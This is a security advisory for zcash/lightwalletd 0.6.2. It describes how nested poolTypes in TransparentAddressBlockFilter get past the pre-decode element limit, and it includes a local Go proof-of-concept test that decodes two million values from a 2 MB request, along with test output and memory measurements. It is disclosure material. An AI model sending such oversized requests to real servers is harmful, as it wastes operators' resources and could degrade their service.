# GHSA-jjjw-r66r-mjgf: Nested poolTypes in TransparentAddressBlockFilter -> bypasses the pre-decode element limit in lightwalletd 0.6.2

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-jjjw-r66r-mjgf |
| CVE | none assigned |
| Severity | low |
| CWE | CWE-400, CWE-770 |
| Published | 2026-11-25T22:56:25Z |
| Updated | 2026-11-25T22:56:25Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.2 (patched: 0.6.3) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-jjjw-r66r-mjgf |

## Description (verbatim)

### Summary

The fix for GHSA-p4pq-3cf7-45rv does not cover nested TransparentAddressBlockFilter.range.poolTypes; no service impact was observed. An anonymous gRPC client can send it to `GetTaddressTxids` or `GetTaddressTransactions`. On `f8fe2cca7ede03b1f06b1d637a2ab467d151b79d`, a 2,000,054-byte request decoded two million values; two 256 MiB rounds showed no OOM.

### Details

The fix associated with [GHSA-p4pq-3cf7-45rv](https://github.com/zcash/lightwalletd/security/advisories/GHSA-p4pq-3cf7-45rv) added a pre-decode scan in [commit 78c8476](https://github.com/zcash/lightwalletd/commit/78c8476). Its commit message says, “Those four message types are every request with a repeated field.” [`requestBounds`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/frontend/codec.go#L32-L44) dispatches only on the top-level message type and returns no bounds for `TransparentAddressBlockFilter`; [`BoundedCodec.Unmarshal`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/frontend/codec.go#L57-L68) then delegates directly to the stock protobuf decoder. The nested `range` is itself a `BlockRange` with repeated field 3, `poolTypes`, so the top-level bound does not apply.

The [protocol definition](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/walletrpc/service.proto#L121-L130) explicitly says the nested `range.poolTypes` field should be ignored and may be rejected. [`GetTaddressTransactions`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/frontend/service.go#L144-L206) reads `Address`, `Range.Start`, and `Range.End`, but not `Range.PoolTypes`; [`GetTaddressTxids`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/frontend/service.go#L237-L243) delegates to it. The finding is unnecessary decoding and allocation before handler logic, not a semantic change to transaction selection. The local PoC proves the pre-scan gap and reachability for the deprecated `GetTaddressTxids` route; the same request type and delegated handler support the `GetTaddressTransactions` route by code inspection, but the latter route was not separately load-tested.


### Proof of concept

Save this local `bufconn` test in a fresh clone; each command uses production `serverOptions`:

```sh
git clone https://github.com/zcash/lightwalletd.git lightwalletd
cd lightwalletd && git checkout f8fe2cca7ede03b1f06b1d637a2ab467d151b79d
for i in 1 2; do
  go test -trimpath ./cmd -run '^TestPoCA3NestedPoolTypes$' -count=1 -v
done
```

### `cmd/zz_poc_a3_nested_test.go`

```go
// Place in cmd/zz_poc_a3_nested_test.go; run: go test -trimpath ./cmd -run '^TestPoCA3NestedPoolTypes$' -count=1 -v
package cmd

import (
	"context"
	"encoding/json"
	"errors"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/zcash/lightwalletd/common"
	"github.com/zcash/lightwalletd/frontend"
	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/test/bufconn"
	"google.golang.org/protobuf/proto"
)

type a3Capture struct {
	walletrpc.CompactTxStreamerServer
	lengths chan int
}

func (s a3Capture) GetTaddressTxids(r *walletrpc.TransparentAddressBlockFilter, out walletrpc.CompactTxStreamer_GetTaddressTxidsServer) error {
	s.lengths <- len(r.Range.PoolTypes)
	return s.CompactTxStreamerServer.GetTaddressTxids(r, out)
}

func TestPoCA3NestedPoolTypes(t *testing.T) {
	const marker = "POC_ONLY_A3_BACKEND"
	original := common.RawRequest
	common.RawRequest = func(_ context.Context, method string, _ []json.RawMessage) (json.RawMessage, error) {
		return nil, errors.New(marker + ": " + method)
	}
	defer func() { common.RawRequest = original }()
	service, err := frontend.NewLwdStreamer(nil, "test", false, 0, 16<<20)
	if err != nil {
		t.Fatal(err)
	}
	capture := a3Capture{CompactTxStreamerServer: service, lengths: make(chan int, 1)}
	listener := bufconn.Listen(1 << 20)
	server := grpc.NewServer(serverOptions(&common.Options{MaxConcurrentRecv: 32})...)
	walletrpc.RegisterCompactTxStreamerServer(server, capture)
	go server.Serve(listener)
	defer server.Stop()
	conn, err := grpc.NewClient("passthrough:///bufnet",
		grpc.WithContextDialer(func(context.Context, string) (net.Conn, error) { return listener.Dial() }),
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	req := &walletrpc.TransparentAddressBlockFilter{
		Address: "taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		Range: &walletrpc.BlockRange{
			Start:     &walletrpc.BlockID{Height: 100},
			End:       &walletrpc.BlockID{Height: 200},
			PoolTypes: make([]walletrpc.PoolType, 2_000_000),
		},
	}
	for i := range req.Range.PoolTypes {
		req.Range.PoolTypes[i] = walletrpc.PoolType_SAPLING
	}
	wire, err := proto.Marshal(req)
	if err != nil || len(wire) > 2<<20 {
		t.Fatalf("wire=%d err=%v", len(wire), err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	stream, err := walletrpc.NewCompactTxStreamerClient(conn).GetTaddressTxids(ctx, req)
	if err != nil {
		t.Fatal(err)
	}
	_, err = stream.Recv()
	if err == nil || !strings.Contains(err.Error(), marker) {
		t.Fatalf("backend not reached: %v", err)
	}
	select {
	case n := <-capture.lengths:
		if n != 2_000_000 {
			t.Fatalf("decoded nested poolTypes=%d", n)
		}
		t.Logf("wire=%d bytes cap=%d decoded_nested_poolTypes=%d backend_reached=true", len(wire), 2<<20, n)
	case <-time.After(time.Second):
		t.Fatal("handler not reached")
	}
}
```

### First run — handler reached

```text
=== RUN   TestPoCA3NestedPoolTypes
    zz_poc_a3_nested_test.go:86: wire=2000054 bytes cap=2097152 decoded_nested_poolTypes=2000000 backend_reached=true
--- PASS: TestPoCA3NestedPoolTypes (0.03s)
PASS
ok  	github.com/zcash/lightwalletd/cmd	0.305s
```

### Linux 256 MiB container comparison

Production-mode lightwalletd (`Darkside=false`) used receive limit 32, 256 MiB, 2 CPUs, and a loopback stub. Each case submitted 32 requests twice. SendTransaction admitted eight versus 32 nested requests: submitted concurrency matched, active handlers did not. Stub delays caused deadlines. Harness and raw outputs are available on request.

| Case | Round | Wire bytes | Elements | Peak RSS (bytes) | RSS/control | OOM |
| --- | ---: | ---: | ---: | ---: | ---: | --- |
| SendTransaction | 1 | 1,999,004 | 0 | 210,370,560 | 1.00 | No |
| packed | 1 | 2,000,054 | 2,000,000 | 191,365,120 | 0.91 | No |
| unpacked | 1 | 2,000,050 | 1,000,000 | 207,122,432 | 0.98 | No |
| SendTransaction | 2 | 1,999,004 | 0 | 206,831,616 | 1.00 | No |
| packed | 2 | 2,000,054 | 2,000,000 | 205,914,112 | 1.00 | No |
| unpacked | 2 | 2,000,050 | 1,000,000 | 247,595,008 | 1.20 | No |

### Impact

A 2 MB request bypassed the 1,000-element bound and decoded two million ignored values. At 256 MiB and 32 submitted requests, packed peak RSS was 0.91/1.00× control; unpacked was 0.98/1.20×. None OOM-killed. This proves unnecessary decoding, but not attack-attributable failures or production DoS; maintainers may classify it as hardening.
